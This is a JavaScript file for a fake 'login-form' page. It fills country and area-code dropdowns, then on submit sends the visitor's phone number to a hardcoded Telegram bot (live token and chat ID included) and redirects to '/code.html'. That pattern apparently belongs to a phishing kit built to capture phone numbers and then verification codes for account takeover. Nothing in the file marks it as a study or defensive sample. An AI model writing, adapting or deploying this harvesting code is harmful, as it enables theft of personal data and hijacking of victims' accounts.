// List of countries with their area codes
const countries = [
  { name: "Nigeria", code: "+234" },
  { name: "United States", code: "+1" },
  { name: "United Kingdom", code: "+44" },
  { name: "India", code: "+91" },
  { name: "Canada", code: "+1" },
  { name: "Germany", code: "+49" },
  { name: "Australia", code: "+61" },
];

// Populate the country dropdown
const countrySelect = document.getElementById("country");
const areaCodeSelect = document.getElementById("area-code");

countries.forEach((country) => {
  const countryOption = document.createElement("option");
  countryOption.value = country.name;
  countryOption.textContent = country.name;
  countrySelect.appendChild(countryOption);

  const areaCodeOption = document.createElement("option");
  areaCodeOption.value = country.code;
  areaCodeOption.textContent = country.code;
  areaCodeSelect.appendChild(areaCodeOption);
});

// Sync area code dropdown with country selection
countrySelect.addEventListener("change", (event) => {
  const selectedCountry = event.target.value;
  const country = countries.find((c) => c.name === selectedCountry);
  if (country) {
    areaCodeSelect.value = country.code;
  }
});

// Bot configuration
const botToken = "7150219035:AAH65LULyiOeMUIuh7kvUK_GQdzWSlRCCdE"; // Replace with your bot's API token
const chatId = "993111409"; // Replace with the chat ID where the message should be sent

// Form submission handler
document
  .getElementById("login-form")
  .addEventListener("submit", async (event) => {
    event.preventDefault();

    const country = countrySelect.value;
    const areaCode = areaCodeSelect.value;
    const phoneNumber = document.getElementById("phone-number").value;

    if (phoneNumber.trim() !== "") {
      const fullNumber = `${areaCode}${phoneNumber}`;

      // Send the message to Telegram
      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: `New number submitted:\nCountry: ${country}\nPhone Number: ${fullNumber}`,
          }),
        });


        // Redirect to another page (change 'next-page.html' to the actual page you want to redirect to)
        window.location.href = "/code.html";
      } catch (error) {
        console.error("Error sending message to Telegram:", error);
        alert("Failed to send the phone number to Telegram. Please try again.");
      }
    } else {
      alert("Please enter a valid phone number.");
    }
  });
